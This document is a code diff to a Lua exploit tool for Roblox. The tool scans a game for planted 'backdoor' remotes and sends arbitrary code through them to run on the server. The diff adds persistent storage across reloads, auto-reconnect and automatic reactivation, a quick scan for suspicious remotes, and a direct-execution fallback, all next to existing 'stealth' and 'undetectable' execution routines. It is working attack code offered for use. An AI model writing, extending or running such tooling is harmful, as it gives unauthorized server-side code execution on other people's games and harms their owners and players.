@@ -11,13 +11,19 @@ _bs._s = tick()
 _bs._cb = nil
 _bs._currentGameId = nil
 
+-- [NEW] Global storage to persist across reloads
+if not _G._pans_backdoor_storage then
+    _G._pans_backdoor_storage = {}
+end
+local _storage = _G._pans_backdoor_storage
+
 local _cfg = {
     debug = false,
     stealth = true,
     maxScanDepth = 20,
     executionDelay = 0.05,
     monitorInterval = 2,
-    autoReconnect = false
+    autoReconnect = true  -- [CHANGED] Auto reconnect enabled
 }
 
 local _str = {
@@ -43,7 +49,7 @@ local _cat = {
 
 local function _log(m, t)
     t = t or "INFO"
-    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" then
+    if _cfg.debug or t == "ERROR" or t == "FOUND" or t == "DISCONNECT" or t == "LEAVE" or t == "REACTIVATE" then
         print(("[BD:%s] %s"):format(t, m))
     end
     if _bs._cb then _bs._cb(m, t) end
@@ -268,6 +274,66 @@ local function _selectRandomBackdoor(backdoors)
     return selected, backup
 end
 
+-- [NEW] Find backdoor by stored path (for reactivation)
+local function _findBackdoorByPath(path)
+    if not path then return nil end
+    
+    -- Try to find the remote by path
+    local segments = {}
+    for segment in string.gmatch(path, "[^%.]+") do
+        table.insert(segments, segment)
+    end
+    
+    local current = game
+    for i, segment in ipairs(segments) do
+        if segment == "game" then
+            current = game
+        else
+            local found = nil
+            local children = {}
+            pcall(function() children = current:GetChildren() end)
+            
+            for _, child in ipairs(children) do
+                if child.Name == segment then
+                    found = child
+                    break
+                end
+            end
+            
+            if not found then
+                -- Try service
+                local ok, svc = pcall(function() return game:GetService(segment) end)
+                if ok and svc then
+                    found = svc
+                else
+                    return nil
+                end
+            end
+            
+            current = found
+        end
+    end
+    
+    -- Verify it's still a valid remote
+    local isValid = pcall(function()
+        return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
+    end)
+    
+    if isValid then
+        return {
+            Object = current,
+            Name = current.Name,
+            Type = current.ClassName,
+            Path = path,
+            Category = "MALICIOUS",
+            Vulnerable = true,
+            ExecutionMethod = "reactivated"
+        }
+    end
+    
+    return nil
+end
+
 -- Monitor backdoor object
 local function _startMonitoring()
     if _bs._monitor then
@@ -285,6 +351,10 @@ local function _startMonitoring()
     local name = target.Name
     local path = _bs._selected.Path
     
+    -- Store in global for persistence
+    _storage.selectedPath = path
+    _storage.selectedType = _bs._selected.Type
+    
     _log("Monitoring: " .. path, "MONITOR")
     
     local lastCheck = tick()
@@ -300,25 +370,28 @@ local function _startMonitoring()
         
         if not exists then
             _log("BACKDOOR_REMOVED: " .. path, "DISCONNECT")
+            _storage.selectedPath = nil
             _bs.Disconnect()
             return
         end
         
         if currentParent ~= parent then
             _log("BACKDOOR_MOVED: " .. path, "DISCONNECT")
+            _storage.selectedPath = nil
             _bs.Disconnect()
             return
         end
         
         if currentName ~= name then
             _log("BACKDOOR_RENAMED: " .. path, "DISCONNECT")
+            _storage.selectedPath = nil
             _bs.Disconnect()
             return
         end
     end)
 end
 
--- [NEW] Monitor for game leave/change
+-- Monitor for game leave/change
 local function _startGameMonitoring()
     if _bs._gameMonitor then
         pcall(function() _bs._gameMonitor:Disconnect() end)
@@ -328,52 +401,48 @@ local function _startGameMonitoring()
     _bs._currentGameId = tostring(game.GameId)
     _log("Game monitoring started. GameId: " .. _bs._currentGameId, "MONITOR")
     
-    -- Monitor GameId changes (game switch)
     local rs = game:GetService("RunService")
     local lastGameCheck = tick()
     
     _bs._gameMonitor = rs.Heartbeat:Connect(function()
-        if tick() - lastGameCheck < 1 then return end  -- Check every second
+        if tick() - lastGameCheck < 1 then return end
         lastGameCheck = tick()
         
-        -- Check if GameId changed (switched games)
         local currentGameId = tostring(game.GameId)
         if currentGameId ~= _bs._currentGameId then
             _log("GAME_CHANGED: " .. _bs._currentGameId .. " -> " .. currentGameId, "LEAVE")
+            _storage.selectedPath = nil  -- Clear stored path
             print("PANS_PLAYER_LEFT:GameChanged")
             _bs.Disconnect()
             return
         end
-        
-        -- Check if player is leaving (BindToClose signal)
-        -- This runs when player closes client
     end)
     
-    -- Bind to close detection
     pcall(function()
         game:BindToClose(function()
             _log("GAME_CLOSING", "LEAVE")
+            _storage.selectedPath = nil
             print("PANS_PLAYER_LEFT:GameClosed")
             _bs.Disconnect()
         end)
     end)
     
-    -- Player leaving detection (if in Studio or specific environments)
     local players = game:GetService("Players")
     local localPlayer = players.LocalPlayer
     
     if localPlayer then
         localPlayer.Destroying:Connect(function()
             _log("PLAYER_DESTROYING", "LEAVE")
+            _storage.selectedPath = nil
             print("PANS_PLAYER_LEFT:PlayerDestroyed")
             _bs.Disconnect()
         end)
         
-        -- Alternative: detect parent change (character respawn doesn't count, but leaving does)
         local lastParent = localPlayer.Parent
         localPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
             if localPlayer.Parent == nil and lastParent ~= nil then
                 _log("PLAYER_PARENT_NIL", "LEAVE")
+                _storage.selectedPath = nil
                 print("PANS_PLAYER_LEFT:ParentNil")
                 _bs.Disconnect()
             end
@@ -394,6 +463,124 @@ local function _stopMonitoring()
     _bs._currentGameId = nil
 end
 
+-- [NEW] Direct execution without active check (fallback)
+local function _directExecute(code, backdoorInfo)
+    if not backdoorInfo or not backdoorInfo.Object then
+        return false
+    end
+    
+    local r = backdoorInfo.Object
+    local t = backdoorInfo.Type
+    
+    local exists = pcall(function() return r.Parent end)
+    if not exists then
+        return false
+    end
+    
+    local function tryExecute()
+        if t == _str.RemoteEvent then
+            pcall(function() r:FireServer(code) end)
+        else
+            pcall(function() r:InvokeServer(code) end)
+        end
+    end
+    
+    return pcall(tryExecute)
+end
+
+-- [MODIFIED] Execute with auto-reactivation
+function _bs.Execute(code)
+    -- First check if we have an active backdoor
+    if _bs._a and _bs._selected then
+        _log("Executing through active backdoor...", "EXEC")
+        return _undetectableExec(code)
+    end
+    
+    -- [NEW] Try to reactivate from storage
+    if _storage.selectedPath then
+        _log("Attempting reactivation from storage: " .. _storage.selectedPath, "REACTIVATE")
+        
+        local restored = _findBackdoorByPath(_storage.selectedPath)
+        if restored then
+            _bs._selected = restored
+            _bs._a = true
+            
+            -- Restart monitoring
+            _startMonitoring()
+            
+            _log("Reactivated successfully!", "REACTIVATE")
+            return _undetectableExec(code)
+        else
+            _log("Stored backdoor no longer exists", "REACTIVATE")
+            _storage.selectedPath = nil
+        end
+    end
+    
+    -- [NEW] Last resort: try quick scan
+    if _cfg.autoReconnect then
+        _log("Attempting quick scan for reactivation...", "REACTIVATE")
+        
+        local found = _bs.QuickScan()
+        if found and _bs._selected then
+            _bs._a = true
+            _startMonitoring()
+            _log("Quick reactivation successful!", "REACTIVATE")
+            return _undetectableExec(code)
+        end
+    end
+    
+    _log("Backdoor not active and reactivation failed", "ERROR")
+    return false
+end
+
+-- [NEW] Quick scan for reactivation (faster than full scan)
+function _bs.QuickScan()
+    -- Only scan common locations
+    local quickServices = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("Workspace")
+    }
+    
+    local foundRemotes = {}
+    
+    for _, svc in ipairs(quickServices) do
+        local children = {}
+        pcall(function() children = svc:GetDescendants() end)
+        
+        for _, obj in ipairs(children) do
+            local isRemote = pcall(function()
+                return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
+            end)
+            
+            if isRemote then
+                local sus, score = _isSus(obj.Name)
+                if sus then
+                    table.insert(foundRemotes, {
+                        Object = obj,
+                        Name = obj.Name,
+                        Type = obj.ClassName,
+                        Path = obj:GetFullName(),
+                        Category = "MALICIOUS",
+                        RiskScore = score,
+                        Vulnerable = true,
+                        ExecutionMethod = "quick_reactivate"
+                    })
+                end
+            end
+        end
+    end
+    
+    if #foundRemotes > 0 then
+        local selected, backup = _selectRandomBackdoor(foundRemotes)
+        _bs._selected = selected
+        _bs._backup = backup
+        return true
+    end
+    
+    return false
+end
+
+-- Undetectable execution
 local function _undetectableExec(code)
     if not _bs._selected then
         _log("No backdoor selected", "ERROR")
@@ -528,29 +715,29 @@ function _bs.Scan()
     return _bs._selected ~= nil, #_bs._n
 end
 
-function _bs.Execute(code)
-    if not _bs._a or not _bs._selected then
-        _log("Backdoor not active", "ERROR")
-        return false
-    end
-    
-    _log("Executing...", "EXEC")
-    return _undetectableExec(code)
-end
-
+-- [MODIFIED] Require with auto-reactivation
 function _bs.Require(mid)
     if type(mid) == "number" then mid = tostring(mid) end
-    local c = ([[
+    
+    local requireCode = ([[
         local s,r=pcall(function()local m=require(%s)return m end)
         if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
     ]]):format(mid)
-    return _bs.Execute(c)
+    
+    -- Use Execute which now has auto-reactivation
+    return _bs.Execute(requireCode)
 end
 
 function _bs.Initialize(cb, cfg)
     _bs._cb = cb
     if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
-    _log("Initialized (Single Mode)", "INIT")
+    
+    -- [NEW] Check if we have stored backdoor from previous session
+    if _storage.selectedPath then
+        _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
+    end
+    
+    _log("Initialized (Auto-Reconnect Enabled)", "INIT")
     return _bs
 end
 
@@ -561,7 +748,7 @@ function _bs.Activate()
         print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
         
         _startMonitoring()
-        _startGameMonitoring()  -- [NEW] Start game monitoring
+        _startGameMonitoring()
         
         _log("Active and monitored", "ACTIVE")
         return true
@@ -587,6 +774,7 @@ function _bs.GetStatus()
         Active = _bs._a,
         HasSelection = _bs._selected ~= nil,
         SelectedPath = _bs._selected and _bs._selected.Path or nil,
+        StoredPath = _storage.selectedPath,  -- [NEW]
         BackupCount = #_bs._backup,
         NormalRemotes = #_bs._n,
         ScanTime = tick() - _bs._s,
